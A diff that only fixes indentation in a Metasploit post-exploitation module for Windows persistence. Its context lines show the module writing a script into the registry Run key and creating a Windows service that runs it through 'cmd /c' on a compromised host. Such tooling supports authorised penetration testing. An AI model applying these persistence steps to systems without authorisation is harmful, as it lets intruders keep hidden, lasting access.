@@ -96,8 +96,8 @@ class MetasploitModule < Msf::Post
     end
 
 
-        # Function for creating log folder and returning log path
-        #-------------------------------------------------------------------------------
+    # Function for creating log folder and returning log path
+    #-------------------------------------------------------------------------------
     def log_file(log_path = nil)
 
         #Get hostname
@@ -109,7 +109,7 @@ class MetasploitModule < Msf::Post
         # Create a directory for the logs
         if log_path
             logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
-            else
+        else
             logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
         end
 
@@ -143,7 +143,7 @@ class MetasploitModule < Msf::Post
         if(key)
             registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,script_on_target,"REG_SZ")
             print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-            else
+        else
             print_error("Error: failed to open the registry key for writing")
         end
 
@@ -159,7 +159,7 @@ class MetasploitModule < Msf::Post
             print_status("Creating service #{nam}")
             service_create(nam, nam, "cmd /c \"#{script_on_target}\"")
             @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
-            else
+        else
             print_error("Insufficient privileges to create service")
         end
 
